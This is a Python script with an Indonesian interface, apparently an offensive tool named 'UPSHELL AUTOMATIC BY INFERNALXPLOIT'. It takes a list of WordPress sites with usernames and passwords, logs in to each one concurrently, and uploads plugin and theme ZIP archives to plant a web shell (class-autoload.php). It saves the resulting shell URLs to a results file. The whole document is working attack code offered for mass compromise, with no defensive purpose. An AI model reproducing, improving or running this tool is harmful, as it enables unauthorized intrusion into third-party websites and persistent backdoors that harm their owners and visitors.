import re, os
from datetime import datetime
from time import sleep
from concurrent.futures import ThreadPoolExecutor

try:
    import requests
except ModuleNotFoundError:
    os.system("pip install requests")
    import requests
try:
    from bs4 import BeautifulSoup
except ModuleNotFoundError:
    os.system("pip install bs4")
    from bs4 import BeautifulSoup

os.system("clear||cls")
cek_upload = []

# Warna terminal
def warna(teks, warna):
    kode = {"merah": "31", "hijau": "32", "putih": "37", "tosca": "36"}
    return f"\033[{kode.get(warna, '37')}m{teks}\033[0m"

# Banner
def banner():
    print(warna("═════════════════════════════════════════════════════", "tosca"))
    print(warna("         UPSHELL AUTOMATIC BY INFERNALXPLOIT", "hijau"))
    print(warna("    X ./RootXploit1337 X Mr.4rex_503 X RootXploit1337", "putih"))
    print(warna("═════════════════════════════════════════════════════", "tosca"))

def uploadShell(session, file: str = None, url: str = None, method: str = None):
    method = (
        "plugin-install.php"
        if method == "plugin"
        else "theme-install.php?browse=popular"
    )
    try:
        response = BeautifulSoup(
            session.get(f"https://{url}/wp-admin/{method}").text,
            "html.parser",
        )
    except:
        response = BeautifulSoup(
            session.get(f"http://{url}/wp-admin/{method}").text,
            "html.parser",
        )
    form = response.find(
        "form", {"enctype": "multipart/form-data", "class": "wp-upload-form"}
    )
    if form:
        data = {
            x.get("name"): x.get("value")
            for x in form.findAll("input", {"type": ["hidden", "submit"]})
        }
        files = {"pluginzip" if "plugin" in method else "themezip": open(file, "rb")}
        session.post(form.get("action"), data=data, files=files)
        location = file.split("/")[-1] if "/" in str(file) else file
        hasil = f"http://{url}/wp-content/{'plugins/plugin' if 'plugin' in method else 'themes/theme'}/class-autoload.php"
        cek_upload.append(hasil)
        open("results/shells.txt", "a").write(hasil + "\n")
        return f"success: {hasil} {method}"
    else:
        return f"failed [input tidak ditemukan] {url} {method}"

def authenWordpress(url, username=None, password=None, file: str = None):
    with requests.Session() as session:
        data = {
            "log": username,
            "pwd": password,
            "wp-submit": "Log+In",
            "testcookie": "1",
        }
        try:
            post = session.post(
                f"https://{url}/wp-login.php",
                data=data,
                headers={
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Content-Length": str(
                        len("&".join(f"{k}={v}" for k, v in data.items()))
                    ),
                    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)",
                },
                cookies={"wordpress_test_cookie": "WP+Cookie+check"},
            )
        except:
            post = session.post(
                f"http://{url}/wp-login.php",
                data=data,
                headers={
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Content-Length": str(
                        len("&".join(f"{k}={v}" for k, v in data.items()))
                    ),
                    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)",
                },
                cookies={"wordpress_test_cookie": "WP+Cookie+check"},
            )
        if "wp-settings-" in str(post.cookies):
            plugin = uploadShell(
                session=session, file="plugin.zip", url=url, method="plugin"
            )
            print(plugin)
            theme = uploadShell(
                session=session, file="theme.zip", url=url, method="theme"
            )
            return theme
        else:
            if "Error code 520" in post.text:
                return f"failed [cloudflare] {url}"
            elif "404 Not Found" in post.text:
                return f"failed [wp login not found] {url}"
            elif "login_error" in post.text:
                return f"failed [username atau password salah] {url}"
            return f"failed [kesalahan di link bahkan u & p bisa saja salah.] {url}"

# Fungsi proses per target
def proses(target):
    try:
        target = target.strip()
        url = re.findall(
            "https://(.*?)/" if "https" in target else "http://(.*?)/",
            str(target),
        )[0]
        target = target.replace("\n", "")
        target = target.split("|", 1)[-1]
        user, pw = target.split("|", 1)
        return authenWordpress(url=url, username=user, password=pw)
    except Exception as e:
        return f"failed [link error / ssl sertifikat] {target} {e}"

if __name__ == "__main__":
    try:
        os.mkdir("results")
    except:
        pass

    banner()
    try:
        results = input(warna(" > File WP List: ", "putih"))
        rH = open(results, "r").readlines()
    except:
        exit(warna("[!] File tidak ditemukan", "merah"))

    try:
        jml = int(input(warna(" > Threads (contoh 5): ", "putih")))
    except:
        jml = 5

    print(warna(f"\n[+] Mulai bruteforce & upload shell ({jml} threads)\n", "tosca"))

    with ThreadPoolExecutor(max_workers=jml) as exe:
        hasil = exe.map(proses, rH)
        for res in hasil:
            print(res)
